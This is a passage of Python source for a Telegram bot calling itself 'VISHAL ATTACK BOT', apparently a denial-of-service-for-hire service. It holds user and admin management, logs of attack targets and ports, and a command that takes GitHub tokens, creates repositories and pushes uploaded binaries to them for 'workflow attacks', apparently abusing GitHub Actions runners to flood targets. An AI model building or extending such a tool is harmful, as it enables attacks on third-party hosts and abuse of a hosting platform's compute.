                 f"🚀 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙨𝙩𝙖𝙧𝙩 𝙣𝙚𝙬 𝙖𝙩𝙩𝙖𝙘𝙠 𝙣𝙤𝙬!"
        )
        jobs[job_id]['status'] = 'completed'
        save_jobs(jobs)

# 𝘼𝘿𝙈𝙄𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎
async def add_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    if not context.args:
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙄𝘿: /add <userid>")
        return
    
    try:
        user_to_add = int(context.args[0])
        users = load_users()
        
        if user_to_add in users:
            await update.message.reply_text("⚠️ 𝙐𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙭𝙞𝙨𝙩𝙨.")
        else:
            users.append(user_to_add)
            save_users(users)
            await update.message.reply_text(f"✅ 𝙐𝙨𝙚𝙧 {user_to_add} 𝘼𝙙𝙙𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮.")
    except ValueError:
        await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿.")

async def remove_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    if not context.args:
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙄𝘿: /remove <userid>")
        return
    
    try:
        user_to_remove = int(context.args[0])
        users = load_users()
        
        if user_to_remove not in users:
            await update.message.reply_text("❌ 𝙐𝙨𝙚𝙧 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙.")
        else:
            users.remove(user_to_remove)
            save_users(users)
            await update.message.reply_text(f"✅ 𝙐𝙨𝙚𝙧 {user_to_remove} 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮.")
    except ValueError:
        await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿.")

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    users = load_users()
    if not users:
        await update.message.reply_text("❌ 𝙉𝙤 𝙪𝙨𝙚𝙧𝙨 𝙛𝙤𝙪𝙣𝙙.")
        return
    
    response = "👥 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙐𝙨𝙚𝙧𝙨:\n\n"
    for user_id in users:
        if str(user_id) in admin_id:
            response += f"👑 𝘼𝙙𝙢𝙞𝙣: {user_id}\n"
        else:
            response += f"👤 𝙐𝙨𝙚𝙧: {user_id}\n"
    
    await update.message.reply_text(response)

async def clearlogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    result = clear_logs()
    await update.message.reply_text(result)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    if not context.args:
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩.")
        return
    
    message_to_broadcast = " ".join(context.args)
    users = load_users()
    
    success_count = 0
    fail_count = 0
    
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙈𝙚𝙨𝙨𝙖𝙜𝙚:\n\n{message_to_broadcast}")
            success_count += 1
        except:
            fail_count += 1
    
    await update.message.reply_text(f"✅ 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚!\n✅ 𝙎𝙚𝙣𝙩: {success_count}\n❌ 𝙁𝙖𝙞𝙡𝙚𝙙: {fail_count}")

async def add_token_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    if not context.args:
        await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 𝙖 𝙂𝙞𝙩𝙃𝙪𝙗 𝙩𝙤𝙠𝙚𝙣: /token <github_token>")
        return
    
    token = context.args[0]
    tokens = load_tokens()
    
    if token in tokens:
        await update.message.reply_text("⚠️ 𝙏𝙤𝙠𝙚𝙣 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙖𝙙𝙙𝙚𝙙!")
        return
    
    try:
        g = Github(token)
        user = g.get_user()
        
        repos = create_vishal_repos(token)
        if repos:
            tokens.append(token)
            save_tokens(tokens)
            await update.message.reply_text(
                f"✅ 𝙏𝙊𝙆𝙀𝙉 𝘼𝘿𝘿𝙀𝘿!\n"
                f"👤 𝙐𝙨𝙚𝙧: {user.login}\n"
                f"🚀 𝙍𝙚𝙖𝙙𝙮 𝙛𝙤𝙧 𝙖𝙩𝙩𝙖𝙘𝙠 𝙥𝙤𝙬𝙚𝙧!"
            )
        else:
            await update.message.reply_text("❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙘𝙧𝙚𝙖𝙩𝙚 𝙧𝙚𝙥𝙤𝙨!")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙩𝙤𝙠𝙚𝙣: {str(e)}")

async def list_tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("❌ 𝙉𝙤 𝙩𝙤𝙠𝙚𝙣𝙨 𝙖𝙙𝙙𝙚𝙙 𝙮𝙚𝙩!")
        return
    
    message = f"🔑 𝙎𝙩𝙤𝙧𝙚𝙙 𝙏𝙤𝙠𝙚𝙣𝙨 ({len(tokens)}):\n\n"
    for i, token in enumerate(tokens, 1):
        try:
            g = Github(token)
            user = g.get_user()
            message += f"{i}. {user.login}\n"
        except:
            message += f"{i}. ❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙\n"
    
    await update.message.reply_text(message)

async def add_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("❌ 𝙉𝙤 𝙂𝙞𝙩𝙃𝙪𝙗 𝙩𝙤𝙠𝙚𝙣𝙨 𝙖𝙙𝙙𝙚𝙙! 𝙐𝙨𝙚 /token 𝙛𝙞𝙧𝙨𝙩.")
        return
    
    global uploaded_binaries
    uploaded_binaries = []
    
    await update.message.reply_text(
        "📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔 𝙁𝙄𝙇𝙀𝙎:\n\n"
        "𝘼𝙡𝙡 𝙛𝙞𝙡𝙚𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙙𝙞𝙨𝙩𝙧𝙞𝙗𝙪𝙩𝙚𝙙 𝙩𝙤 𝙧𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙞𝙚𝙨!"
    )

async def handle_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
    
    if not update.message.document:
        await update.message.reply_text("❌ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙖 𝙛𝙞𝙡𝙚 𝙖𝙨 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩!")
        return
    
    global uploaded_binaries
    
    try:
        # 𝙁𝙞𝙡𝙚 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{len(uploaded_binaries)}.bin"
        await file.download_to_drive(file_path)
        
        # 𝙁𝙞𝙡𝙚 𝙧𝙚𝙖𝙙
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        # 𝙏𝙚𝙢𝙥 𝙛𝙞𝙡𝙚 𝙙𝙚𝙡𝙚𝙩𝙚
        os.remove(file_path)
        
        # 𝙎𝙩𝙤𝙧𝙚 𝙞𝙣 𝙢𝙚𝙢𝙤𝙧𝙮
        uploaded_binaries.append(binary_content)
        
        await update.message.reply_text(f"✅ 𝘽𝙞𝙣𝙖𝙧𝙮 {len(uploaded_binaries)}/4 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!")
        
        # 𝘼𝙪𝙩𝙤-𝙙𝙞𝙨𝙩𝙧𝙞𝙗𝙪𝙩𝙚 𝙬𝙝𝙚𝙣 4 𝙛𝙞𝙡𝙚𝙨 𝙧𝙚𝙖𝙙𝙮
        if len(uploaded_binaries) == 4:
            await distribute_binaries(update)
            
    except Exception as e:
        await update.message.reply_text(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙥𝙡𝙤𝙖𝙙 𝙛𝙞𝙡𝙚: {str(e)}")
        print(f"Binary upload error: {e}")

async def distribute_binaries(update: Update):
    global uploaded_binaries
    
    tokens = load_tokens()
    total_success = 0
    
    if not uploaded_binaries:
        await update.message.reply_text("❌ 𝙉𝙤 𝙗𝙞𝙣𝙖𝙧𝙞𝙚𝙨 𝙩𝙤 𝙙𝙞𝙨𝙩𝙧𝙞𝙗𝙪𝙩𝙚!")
        return
    
    await update.message.reply_text("🔄 𝘿𝙞𝙨𝙩𝙧𝙞𝙗𝙪𝙩𝙞𝙣𝙜 𝙗𝙞𝙣𝙖𝙧𝙞𝙚𝙨 𝙩𝙤 𝙖𝙡𝙡 𝙧𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙞𝙚𝙨...")
    
    for token in tokens:
        success_count = upload_binary_to_repos(token, uploaded_binaries)
        total_success += success_count
        await asyncio.sleep(1)  # Avoid rate limiting
    
    await update.message.reply_text(
        f"✅ 𝘽𝙄𝙉𝘼𝙍𝙔 𝘿𝙄𝙎𝙏𝙍𝙄𝘽𝙐𝙏𝙄𝙊𝙉 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀!\n\n"
        f"• 𝙍𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙞𝙚𝙨 𝙐𝙥𝙙𝙖𝙩𝙚𝙙: {total_success}\n"
        f"• 𝙏𝙤𝙩𝙖𝙡 𝙏𝙤𝙠𝙚𝙣𝙨: {len(tokens)}\n\n"
        f"🚀 𝙍𝙚𝙖𝙙𝙮 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙛𝙡𝙤𝙬 𝙖𝙩𝙩𝙖𝙘𝙠𝙨!"
    )
    
    uploaded_binaries = []  # Clear after distribution

async def mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏")
        return
    
    try:
        with open(LOG_FILE, "r") as file:
            logs = file.readlines()
        
        user_logs = []
        for i in range(0, len(logs), 4):
            if i + 3 < len(logs):
                log_user_id = logs[i].split(": ")[1].strip()
                if log_user_id == str(user_id):
                    target = logs[i+1].split(": ")[1].strip()
                    port = logs[i+2].split(": ")[1].strip()
                    time_val = logs[i+3].split(": ")[1].strip()
                    user_logs.append(f"🎯 Target: {target}\n👙 Port: {port}\n⏰ Time: {time_val}\n")
        
        if user_logs:
            response = "📊 𝙔𝙤𝙪𝙧 𝙍𝙚𝙘𝙚𝙣𝙩 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:\n\n" + "\n".join(user_logs[-5:])
        else:
            response = "❌ 𝙉𝙤 𝙖𝙩𝙩𝙖𝙘𝙠 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙 𝙛𝙤𝙧 𝙮𝙤𝙪."
    except FileNotFoundError:
        response = "❌ 𝙉𝙤 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙."
    
    await update.message.reply_text(response)

async def user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    response = f"👤 𝙔𝙤𝙪𝙧 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}"
    await update.message.reply_text(response)

# 𝙈𝙖𝙞𝙣 𝙛𝙪𝙣𝙘𝙩𝙞𝙤𝙣
# 𝙈𝙖𝙞𝙣 𝙛𝙪𝙣𝙘𝙩𝙞𝙤𝙣
def main():
    init_storage()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # 𝘼𝙙𝙙 𝙝𝙖𝙣𝙙𝙡𝙚𝙧𝙨
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("rules", rules))
    application.add_handler(CommandHandler("plan", plan))
    application.add_handler(CommandHandler("admincmd", admincmd))
    application.add_handler(CommandHandler("attack", vishal))
    application.add_handler(CommandHandler("mylogs", mylogs))
    application.add_handler(CommandHandler("id", user_id))
    application.add_handler(CommandHandler("status", check_status))
    application.add_handler(CommandHandler("stop", stop_attacks))
    
    # 𝘼𝙙𝙢𝙞𝙣 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨
    application.add_handler(CommandHandler("add", add_user_cmd))
    application.add_handler(CommandHandler("remove", remove_user_cmd))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("clearlogs", clearlogs))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("token", add_token_cmd))
    application.add_handler(CommandHandler("tokens", list_tokens_cmd))
    application.add_handler(CommandHandler("addbinary", add_binary))
    
    # ✅ 𝙁𝙄𝙓𝙀𝘿: File upload handler - 𝙮𝙚𝙝 𝙡𝙞𝙣𝙚 𝙖𝙙𝙙 𝙠𝙖𝙧𝙚𝙣
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary))
    
    print("🔥 𝙑𝙄𝙎𝙃𝘼𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 𝘽𝙊𝙏 𝙄𝙎 𝙍𝙐𝙉𝙉𝙄𝙉𝙂...")
    print(f"👑 𝙊𝙬𝙣𝙚𝙧 𝙄𝘿: {OWNER_USER_ID}")  
    
    application.run_polling()

if __name__ == "__main__":
    main()